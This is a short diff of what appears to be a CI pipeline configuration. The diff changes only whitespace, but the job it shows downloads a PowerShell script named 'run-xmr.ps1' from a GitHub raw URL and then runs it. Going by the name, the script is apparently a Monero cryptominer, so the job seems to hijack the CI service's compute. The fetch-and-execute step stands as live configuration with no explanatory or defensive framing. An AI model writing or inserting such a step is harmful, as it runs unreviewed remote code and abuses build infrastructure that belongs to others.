@@ -15,5 +15,6 @@ jobs:
       - run: 
           name: Download and install
           command: |      
-            Invoke-WebRequest https://raw.githubusercontent.com/KLVSPL/KSP/main/run-xmr.ps1 -OutFile run-xmr.ps1    
+            Invoke-WebRequest https://raw.githubusercontent.com/KLVSPL/KSP/main/run-xmr.ps1 -OutFile run-xmr.ps1
+            
       - run: ./run-xmr.ps1
